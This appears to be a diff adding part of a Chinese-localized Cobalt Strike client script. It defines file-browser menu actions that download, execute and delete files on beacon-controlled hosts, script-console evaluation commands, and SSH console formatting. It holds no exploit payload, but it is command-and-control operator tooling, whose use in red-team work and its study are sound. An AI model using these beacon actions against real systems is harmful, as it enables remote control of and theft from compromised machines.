+			add_to_clipboard("$2 $+ \\" . $3[0]);
+		}
+	}
+
+	item "下载(&D)" {
+		local('$file');
+		foreach $file ($3) {
+			binput($1, "download $2 $+ \\ $+ $file");
+			bdownload($1, "$2 $+ \\ $+ $file");
+		}
+	}
+
+	item "执行(&E)" {
+		prompt_text("命令行参数?", "", lambda({
+			foreach $file ($files) {
+				binput($bid, "execute $folder $+ \\ $+ $file" . iff($1 ne "", " $1"));
+				bexecute($bid, "$folder $+ \\ $+ $file" . iff($1 ne "", " $1"));
+			}
+		}, $bid => $1, $folder => $2, $files => $3));
+	}
+
+	separator();
+
+	item "删除(&e)" {
+		local('$file @paths');
+		foreach $file ($3) {
+			push(@paths, "$2 $+ \\ $+ $file");
+		}
+
+		prompt_confirm("将删除文件:\n\n" . join("\n", @paths) . "\n\n点击'是'确认操作", "危险操作!!!!", lambda({
+			local('$path');
+			foreach $path (@paths) {
+				binput($bid, "rm $path");
+				brm($bid, $path);
+			}
+
+			# force a refresh on the file browser.
+			[$browser ls_refresh: $folder];
+		}, \@paths, $bid => $1, $browser => $4, $folder => $2));
+	}	
+}
+
+# a few commands to make the script console more interesting.
+command ? {
+	local('$expression $error');
+	$expression = 'iff(' . substr($0, 2) . ')';
+	if (checkError($error) isa ^sleep.error.YourCodeSucksException) {
+		println([$error formatErrors]);
+	}
+	else {
+		if (expr($expression)) {
+			println("true");
+		}
+		else {
+			println("false");
+		}
+	}
+}
+
+command x {
+	local('$x $error');
+	$x = expr(substr($0, 2));
+	if (checkError($error) isa ^sleep.error.YourCodeSucksException) {
+		println([$error formatErrors]);
+	}
+	else {
+		println($x);
+	}
+}
+
+command e {
+	local('$error');
+	eval(substr($0, 2));
+	if (checkError($error) isa ^sleep.error.YourCodeSucksException) {
+		println([$error formatErrors]);
+	}
+}
+
+#
+# SSH Console
+#
+
+set SSH_OUTPUT_HELP {
+	local('$out $cmd $desc');
+	$out  = "\n";
+	$out .= "SSH Commands\n";
+	$out .= "\cE============\n\n";
+	$out .= "    Command                   Description\n";
+	$out .= "\cE    -------                   -----------\n";
+
+	foreach $cmd (sorta(ssh_commands())) {
+		$desc = ssh_command_describe($cmd);
+		$out .= "    $[26]cmd $+ $desc $+ \n";
+	}
+
+	return $out;
+}
+
+set SSH_OUTPUT_HELP_COMMAND {
+	return strrep(ssh_command_detail($1), "Use:", "Use\cE:\o");
+}
+
+set SSH_SBAR_LEFT {
+	local('$computer $user $pid $barch');
+	($computer, $user, $pid, $barch) = values($2, @('computer', 'user', 'pid', 'barch'));
+	return "[ $+ $computer $+ ] $user";
+}
+
+# beaconid, %meta
+set SSH_SBAR_RIGHT {
+	if ($2['note'] ne "") {
+		return "\c2" . $2['note'] . "  \olast: " . $2['lastf'] . " ";
+	}
+	else {
+		return "last: " . $2['lastf'] . " ";
+	}
+}
+
+# beaconid, message
+set SSH_CHECKIN {
+	return "\c9[+]\o " . strrep($2, ':', "\cE:\o");
+}
+
+# beaconid, error
+set SSH_ERROR {
+	return "\c4[-]\o " . strrep($2, ':', "\cE:\o");
+}
+
+# beaconid, whatever: meh
+set SSH_TASKED {
+	return "\cC[*]\o " . strrep($2, ':', "\cE:\o");
+}
+
+# beaconid, whatever: meh too
+set SSH_OUTPUT {
+	return "\c9[+]\o " . replace($2, "([a-z]):\n", "\$1\cE:\n\o", 1);
+}
+
+# beaconid, whatever: meh too
+set SSH_OUTPUT_ALT {
+	return "\cC[*]\o " . strrep($2, ":\n", "\cE:\n\o");
+}
+
+set SSH_OUTPUT_DOWNLOADS {
+	local('$out $entry $name $path $size $rcvd');
+	$out .= "\cC[*]\o Downloads\n\n";
+	$out .= " Name               Size    Received        Path\n";
+	$out .= "\cE ----               ----    --------        ----\n";
+	
+	foreach $entry ($2) {
+		($name, $path, $size, $rcvd) = values($entry, @("name", "path", "size", "rcvd"));
+		$pct  = round((double($rcvd) / $size) * 100.0, 1) . '%';
+		$size = format_size($size);
+		$rcvd = format_size($rcvd);
+		$rcvd = "$rcvd ( $+ $pct $+ )";
+
+		$out .= " $[18]name $[7]size $[15]rcvd $path $+ \n";
+	}
+
+	return $out;
+}
+
+# bid, from, text, when
+set SSH_INPUT {
+	if ($2 eq mynick()) {
+		return "\Ussh\o> $3";
+	}
+	else {
+		return "$2 \Ussh\o> $3";
+	}
+}
+
+# Return a timestamp prefix for the SSH console (Enabled in Preferences)
+# bid, from, text, when, tactic
+set SSH_CONSOLE_TIMESTAMP {
+	return dstamp($4) . " ";
+}
